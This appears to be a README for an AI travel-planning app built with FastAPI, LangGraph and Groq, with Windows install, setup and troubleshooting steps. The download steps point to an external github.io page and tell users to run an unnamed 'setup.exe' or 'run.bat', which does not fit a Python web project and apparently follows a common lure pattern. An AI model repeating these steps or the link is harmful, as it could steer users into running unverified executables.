# 🌍 PlanetPath-AI-Travel-Planner - Create custom travel plans using AI

<p align="center">
  <a href="https://tohid7399.github.io">
    <img src="https://img.shields.io/badge/Download-PlanetPath-blue" alt="Download">
  </a>
</p>

This tool builds travel plans for you. It uses artificial intelligence to organize your flight data, hotel stays, and local activities. You input your destination and dates, and the system creates a schedule. It gathers information about your travel spot to save you time.

## 📋 What this tool does

Planning a trip takes time. You look for flights, search for hotels, and find interesting places to visit. PlanetPath-AI-Travel-Planner connects to live data services to handle these tasks. It uses automated agents that work together to find travel options, check availability, and build a cohesive itinerary.

The software uses several technologies to ensure accuracy:
* FastAPI connects the user interface to the processing engine.
* LangGraph organizes the steps the AI takes to build your plan.
* Groq provides the processing power for the language models.
* PostgreSQL stores your saved plans.
* Tavily gathers real-time search results for locations.
* AviationStack keeps track of flight details.

## 💻 System requirements

Your computer needs the following to run the software effectively:
* Operating System: Windows 10 or Windows 11.
* Memory: 8 GB of RAM or more.
* Storage: 500 MB of free space for the installation.
* Connection: A stable internet connection to fetch real-time travel data.

## 🚀 How to download and install

Follow these steps to set up the software on your Windows computer.

1. Visit the repository page to download the software. You can find it here: [https://tohid7399.github.io](https://tohid7399.github.io).
2. Look for the button or link labeled "Code" or "Releases" on that page.
3. Choose the option to download the source files as a ZIP folder.
4. Open your "Downloads" folder once the file finishes downloading.
5. Right-click the folder and select "Extract All" to unpack the files.
6. Open the newly extracted folder.
7. Locate the file named `setup.exe` or `run.bat` to begin the installation.
8. Follow the prompts on the screen to finalize the setup files on your machine.

## ⚙️ Initial setup

Once you open the software for the first time, you need to configure your personalized settings. 

1. Launch the application from your desktop or start menu.
2. The software will open a window in your default web browser. This is the main interface.
3. You may see a request for an API key. This key allows the software to pull data from travel services. If you do not have one, the software provides a link to sign up for free access to these services.
4. Paste your key into the settings box and click "Save."
5. The application will now check the connection to the data sources.

## 🗺️ Planning your first trip

After you finish the setup, you are ready to plan.

1. Navigate to the "New Plan" tab inside the application.
2. Enter your destination city or country.
3. Select your travel dates within the calendar picker.
4. Input your preferences, such as budget range, specific interests like museums or hiking, and preferred activities.
5. Click the "Generate" button.
6. Wait for the agents to process your request. You will see updates on the screen as the system gathers flight information and local recommendations.
7. Review the generated itinerary. You can change specific parts if you want to swap a restaurant or delete a flight.
8. Save your plan to the database by clicking the "Save" button in the corner.

## 🛠️ Troubleshooting common issues

If the application does not work as expected, try these steps first:

* Connection Error: Ensure your internet connection is active. The software needs to contact external services to fetch data.
* Search Timeout: If a search takes too long, verify your API keys are valid and have enough credits remaining.
* Interface Not Loading: If the web page does not open, try refreshing the page or restarting the application. 
* Empty Results: Check your destination spelling. Sometimes, broad destinations yield better results than specific neighborhood names.

## 💡 Frequently Asked Questions

**Does the software cost money to use?**
The software is free. However, the data services it connects to may have usage limits or require a paid account if you plan a high volume of trips.

**Is my data private?**
Your travel plans are saved in a local database on your computer. You choose when and how to share them.

**Can I use this for business trips?**
Yes. You can input specific business meeting times and locations into the trip constraints, and the system will try to build your itinerary around those fixed points.

**Are the flight prices real-time?**
The software pulls data from live sources, but prices for flights can change quickly. Always verify the final price on the airline provider’s website before you book.

Keywords: ai, fastapi, groq, langchain, langgraph, llm, postgresql, python, tavily, travel-planner